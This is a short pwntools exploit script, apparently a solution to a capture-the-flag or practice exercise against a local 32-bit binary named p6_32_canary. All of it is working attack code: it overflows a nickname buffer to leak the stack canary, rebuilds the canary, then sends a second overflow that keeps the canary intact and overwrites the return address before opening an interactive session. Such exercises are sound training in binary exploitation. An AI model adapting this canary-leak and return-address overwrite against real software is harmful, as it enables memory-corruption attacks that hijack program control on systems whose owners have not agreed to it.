from pwn import *

#context.log_level = "DEBUG"

successful = 0x08048712
failed = 0x08048724

p = process("./p6_32_canary")

p.recvuntil("0x")
leak = int(p.recvline()[:-1],16)
print "leak = 0x%x" % leak

p.sendlineafter(" : ", "aaaa")
p.sendlineafter(" : ", "bbbb")

payload = "a"*(0x20 + 1)

p.sendafter("nicname\n", payload)

p.recvuntil(payload)
canary = p.recv(3)
canary = "\x00" + canary
canary = u32(canary)
print "canary = 0x%x" % canary

p.sendlineafter("break?", "0")

payload = "a"*0x20
payload += p32(canary)
payload += "b"*12
payload += p32(failed)

p.sendlineafter(" : ", "aaaa")
p.sendlineafter(" : ", "bbbb")
p.sendafter("nicname\n", payload)
p.sendlineafter("break?", "1")

p.interactive()
